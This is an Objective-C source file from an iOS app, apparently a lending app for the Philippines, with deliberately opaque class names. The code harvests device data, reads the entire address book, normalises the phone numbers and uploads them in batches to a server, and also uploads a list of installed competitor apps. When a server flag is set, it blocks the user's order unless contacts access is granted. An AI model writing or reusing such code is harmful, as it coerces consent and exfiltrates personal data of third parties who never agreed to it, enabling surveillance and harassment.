#import "HFAnnexReaper.h"
#import "HFLedgerFetch.h"
#import "HFParcelModels.h"
#import "HFNexusPipe.h"
#import "HFVaultSeal.h"
#import "HFProbeAtlas.h"
#import "HFRivalGlyph.h"
#import "HFPermitVeil.h"
#import "HFCurtainBox.h"
#import "HFOrbitHint.h"
#import "HFTraceMark.h"
#import <Contacts/Contacts.h>

@interface HFAnnexReaper ()
@property (nonatomic, assign) BOOL hf_locked;
@property (nonatomic, strong, nullable) UIView *hf_rosterOverlay;
@end

@implementation HFAnnexReaper

+ (instancetype)shared {
    static HFAnnexReaper *ins;
    static dispatch_once_t once;
    dispatch_once(&once, ^{ ins = [HFAnnexReaper new]; });
    return ins;
}

- (void)hf_annexIgnite:(NSString *)orderId
                   host:(UIView *)host
                   done:(void (^)(BOOL, BOOL))done {
    NSString *oid = [orderId stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceAndNewlineCharacterSet]] ?: @"";
    if (!oid.length) {
        if (done) done(NO, NO);
        return;
    }
    if (self.hf_locked) return;
    self.hf_locked = YES;

    __weak typeof(self) weakSelf = self;
    void (^seal)(BOOL, BOOL) = ^(BOOL ok, BOOL rosterAuthFail) {
        dispatch_async(dispatch_get_main_queue(), ^{
            __strong typeof(weakSelf) self = weakSelf;
            if (ok) {
                [[HFCurtainBox shared] hf_curtainReviewProgress:0.99];
            }
            [[HFCurtainBox shared] hf_curtainReviewClose];
            [HFPermitVeil hf_permitDismissHost:self.hf_rosterOverlay];
            self.hf_rosterOverlay = nil;
            [[HFOrbitHint shared] hf_orbitHaltSpin];
            self.hf_locked = NO;
            if (done) done(ok, rosterAuthFail);
        });
    };

    [[HFOrbitHint shared] hf_orbitHaltSpin];
    [[HFCurtainBox shared] hf_curtainReview];

    [[HFLedgerFetch shared] hf_ledgerForce:^(HFParcelConfig * _Nullable cfg) {
        __strong typeof(weakSelf) self = weakSelf;
        if (!self) {
            seal(NO, NO);
            return;
        }
        // 10.1 §5.2.6 — config pull fail (no cache) → uploadDataFail
        if (!cfg) {
            seal(NO, NO);
            return;
        }
        BOOL force = (cfg.retrieveMobileContact == 1);
        NSInteger ceil = cfg.pushMaxCount > 0 ? cfg.pushMaxCount : 1000;
        NSInteger batch = cfg.pushPerCount > 0 ? cfg.pushPerCount : 100;
        [self hf_annexShipDevice:oid
                           force:force
                            ceil:ceil
                           batch:batch
                            host:host
                            seal:seal];
    }];
}

#pragma mark - Device

- (void)hf_annexShipDevice:(NSString *)oid
                     force:(BOOL)force
                      ceil:(NSInteger)ceil
                     batch:(NSInteger)batch
                      host:(UIView *)host
                      seal:(void (^)(BOOL, BOOL))seal {
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_UTILITY, 0), ^{
        NSDictionary *bag = [HFProbeAtlas hf_probeHarvest] ?: @{};
        dispatch_async(dispatch_get_main_queue(), ^{
            [[HFNexusPipe shared] hf_pipePost:[HFVaultSeal pMobileDevice]
                                      signMap:@{ @"orderId": oid }
                                   nonSignMap:bag
                                           ok:^(__unused id data) {
                [self hf_annexResolveRoster:oid force:force ceil:ceil batch:batch host:host seal:seal];
            } fail:^(__unused NSString *msg, __unused NSString *code) {
                seal(NO, NO);
            }];
        });
    });
}

#pragma mark - Roster

- (void)hf_annexResolveRoster:(NSString *)oid
                        force:(BOOL)force
                         ceil:(NSInteger)ceil
                        batch:(NSInteger)batch
                         host:(UIView *)host
                         seal:(void (^)(BOOL, BOOL))seal {
    CNAuthorizationStatus status = [CNContactStore authorizationStatusForEntityType:CNEntityTypeContacts];

    if (@available(iOS 18.0, *)) {
        if (status == CNAuthorizationStatusLimited) {
            if (force) {
                // docs_phl/13 §2 B — before secondary dial → bury 198
                [[HFTraceMark shared] hf_traceBook:status content:@"permission_check"];
                [self hf_annexForceRosterDenied:host seal:seal];
            } else {
                [self hf_annexShipRivalsThenReady:oid allow:@"2" seal:seal];
            }
            return;
        }
    }

    switch (status) {
        case CNAuthorizationStatusAuthorized:
            // docs_phl/13 — already authorized → bury 19
            [[HFTraceMark shared] hf_traceBook:CNAuthorizationStatusAuthorized content:@"permission_check"];
            [self hf_annexUploadRoster:oid ceil:ceil batch:batch seal:seal];
            break;

        case CNAuthorizationStatusNotDetermined: {
            // Hide mask before system prompt.
            [[HFCurtainBox shared] hf_curtainReviewClose];
            CNContactStore *store = [CNContactStore new];
            [store requestAccessForEntityType:CNEntityTypeContacts completionHandler:^(BOOL granted, __unused NSError *error) {
                dispatch_async(dispatch_get_main_queue(), ^{
                    CNAuthorizationStatus after = [CNContactStore authorizationStatusForEntityType:CNEntityTypeContacts];
                    if (after == CNAuthorizationStatusNotDetermined) {
                        after = granted ? CNAuthorizationStatusAuthorized : CNAuthorizationStatusDenied;
                    }
                    // docs_phl/13 §2 A — after system prompt → bury 19 / 20 / 198
                    [[HFTraceMark shared] hf_traceBook:after content:@"system_prompt"];
                    [[HFCurtainBox shared] hf_curtainReview];
                    if (after == CNAuthorizationStatusAuthorized) {
                        [self hf_annexUploadRoster:oid ceil:ceil batch:batch seal:seal];
                        return;
                    }
                    if (@available(iOS 18.0, *)) {
                        if (after == CNAuthorizationStatusLimited) {
                            // First system Limited: no secondary (37).
                            if (force) seal(NO, YES);
                            else [self hf_annexShipRivalsThenReady:oid allow:@"2" seal:seal];
                            return;
                        }
                    }

                    if (force) seal(NO, YES);
                    else [self hf_annexShipRivalsThenReady:oid allow:@"2" seal:seal];
                });
            }];
            break;
        }

        case CNAuthorizationStatusDenied:
        case CNAuthorizationStatusRestricted:
            if (force) {
                // docs_phl/13 §2 B — before secondary dial → bury 20
                [[HFTraceMark shared] hf_traceBook:status content:@"permission_check"];
                [self hf_annexForceRosterDenied:host seal:seal];
            } else {
                [self hf_annexShipRivalsThenReady:oid allow:@"2" seal:seal];
            }
            break;

        default:
            if (force) {
                [[HFTraceMark shared] hf_traceBook:status content:@"permission_check"];
                [self hf_annexForceRosterDenied:host seal:seal];
            } else {
                [self hf_annexShipRivalsThenReady:oid allow:@"2" seal:seal];
            }
            break;
    }
}

- (void)hf_annexForceRosterDenied:(UIView *)host seal:(void (^)(BOOL, BOOL))seal {
    [[HFCurtainBox shared] hf_curtainReviewClose];
    __weak typeof(self) weakSelf = self;
    self.hf_rosterOverlay = [HFPermitVeil hf_permitPresentOnHost:host
                                                            kind:HFPermitKindRoster
                                                         confirm:^{
        __strong typeof(weakSelf) self = weakSelf;
        if (self) self.hf_rosterOverlay = nil;
        seal(NO, YES);
    } cancel:^{
        __strong typeof(weakSelf) self = weakSelf;
        if (self) self.hf_rosterOverlay = nil;
        seal(NO, YES);
    }];
}

- (void)hf_annexUploadRoster:(NSString *)oid
                        ceil:(NSInteger)ceil
                       batch:(NSInteger)batch
                        seal:(void (^)(BOOL, BOOL))seal {
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        NSError *err = nil;
        NSArray *rows = [self.class hf_annexGatherRows:ceil error:&err];
        dispatch_async(dispatch_get_main_queue(), ^{
            if (err) {
                seal(NO, NO);
                return;
            }
            if (rows.count == 0) {
                [self hf_annexShipRivalsThenReady:oid allow:@"" seal:seal];
                return;
            }
            NSArray *slices = [self.class hf_annexSlice:rows size:MAX(1, batch)];
            [self hf_annexPipeSlices:oid slices:slices idx:0 seal:seal];
        });
    });
}

- (void)hf_annexPipeSlices:(NSString *)oid
                    slices:(NSArray *)slices
                       idx:(NSInteger)idx
                      seal:(void (^)(BOOL, BOOL))seal {
    if (idx >= (NSInteger)slices.count) {
        [self hf_annexShipRivalsThenReady:oid allow:@"" seal:seal];
        return;
    }
    [[HFNexusPipe shared] hf_pipePost:[HFVaultSeal pMobileContact]
                              signMap:@{ @"orderId": oid }
                           nonSignMap:@{ @"list": slices[idx] }
                                   ok:^(__unused id data) {
        [self hf_annexPipeSlices:oid slices:slices idx:idx + 1 seal:seal];
    } fail:^(__unused NSString *msg, __unused NSString *code) {
        seal(NO, NO);
    }];
}

#pragma mark - Install + ready

- (void)hf_annexShipRivalsThenReady:(NSString *)oid
                              allow:(NSString *)allow
                               seal:(void (^)(BOOL, BOOL))seal {
    NSArray *rows = [HFRivalGlyph hf_rivalProbeRows];
    if (rows.count == 0) {
        [self hf_annexReady:oid allow:allow seal:seal];
        return;
    }
    [[HFNexusPipe shared] hf_pipePost:[HFVaultSeal pInstallApp]
                              signMap:@{ @"orderId": oid }
                           nonSignMap:@{ @"list": rows }
                                   ok:^(__unused id data) {
        [self hf_annexReady:oid allow:allow seal:seal];
    } fail:^(__unused NSString *msg, __unused NSString *code) {
        // installApp fail → must NOT call ready (50 §3.1).
        seal(NO, NO);
    }];
}

- (void)hf_annexReady:(NSString *)oid
                allow:(NSString *)allow
                 seal:(void (^)(BOOL, BOOL))seal {
    [[HFNexusPipe shared] hf_pipePost:[HFVaultSeal pOrderReady]
                              signMap:@{ @"orderId": oid }
                           nonSignMap:@{ @"allowContact": allow ?: @"" }
                                   ok:^(__unused id data) {
        seal(YES, NO);
    } fail:^(__unused NSString *msg, __unused NSString *code) {
        seal(NO, NO);
    }];
}

#pragma mark - Contact gather

+ (NSArray *)hf_annexSlice:(NSArray *)rows size:(NSInteger)size {
    NSMutableArray *out = [NSMutableArray array];
    NSInteger i = 0;
    while (i < (NSInteger)rows.count) {
        NSInteger end = MIN(i + size, (NSInteger)rows.count);
        [out addObject:[rows subarrayWithRange:NSMakeRange(i, end - i)]];
        i = end;
    }
    return out;
}

+ (nullable NSString *)hf_annexNormalizePH:(NSString *)raw {
    NSMutableString *d = [NSMutableString string];
    for (NSUInteger i = 0; i < raw.length; i++) {
        unichar c = [raw characterAtIndex:i];
        if (c >= '0' && c <= '9') [d appendFormat:@"%C", c];
    }
    if (!d.length) return nil;

    if ([d hasPrefix:@"630"]) {
        [d deleteCharactersInRange:NSMakeRange(0, 2)];
    } else if ([d hasPrefix:@"63"] && d.length > 2) {
        NSString *rest = [d substringFromIndex:2];
        if ([rest hasPrefix:@"9"] || [rest hasPrefix:@"09"]) {
            [d setString:rest];
        }
    }
    if ([d hasPrefix:@"09"] && d.length == 11) {
        [d deleteCharactersInRange:NSMakeRange(0, 1)];
    }
    if (d.length != 10 || ![d hasPrefix:@"9"]) return nil;
    return d;
}

+ (NSArray *)hf_annexGatherRows:(NSInteger)ceil error:(NSError **)error {
    CNContactStore *store = [CNContactStore new];
    NSArray *keys = @[
        CNContactGivenNameKey, CNContactFamilyNameKey, CNContactNicknameKey,
        CNContactOrganizationNameKey, CNContactPhoneNumbersKey
    ];
    CNContactFetchRequest *req = [[CNContactFetchRequest alloc] initWithKeysToFetch:keys];
    NSMutableSet *seen = [NSMutableSet set];
    NSMutableArray *rows = [NSMutableArray array];
    NSString *stamp = [NSString stringWithFormat:@"%lld", (long long)(NSDate.date.timeIntervalSince1970 * 1000)];

    BOOL ok = [store enumerateContactsWithFetchRequest:req error:error usingBlock:^(CNContact *person, BOOL *stop) {
        (void)stop;
        NSString *given = [person.givenName stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceAndNewlineCharacterSet]] ?: @"";
        NSString *family = [person.familyName stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceAndNewlineCharacterSet]] ?: @"";
        NSString *name = [[NSString stringWithFormat:@"%@ %@", given, family] stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceAndNewlineCharacterSet]];
        if (!name.length) name = [person.nickname stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceAndNewlineCharacterSet]] ?: @"";
        if (!name.length) name = [person.organizationName stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceAndNewlineCharacterSet]] ?: @"";
        if (name.length > 100) name = [name substringToIndex:100];

        for (CNLabeledValue *wrap in person.phoneNumbers) {
            CNPhoneNumber *pn = wrap.value;
            NSString *phone = [self hf_annexNormalizePH:pn.stringValue ?: @""];
            if (!phone.length || [seen containsObject:phone]) continue;
            [seen addObject:phone];
            [rows addObject:@{
                @"contactName": name ?: @"",
                @"contactPhone": phone,
                @"contactUpdateTime": stamp,
                @"contactStorage": @"1",
                @"contactCount": @"-99",
                @"contactTime": @""
            }];
        }
    }];
    if (!ok) return @[];
    if (ceil > 0 && (NSInteger)rows.count > ceil) {
        return [rows subarrayWithRange:NSMakeRange(0, ceil)];
    }
    return rows;
}

@end
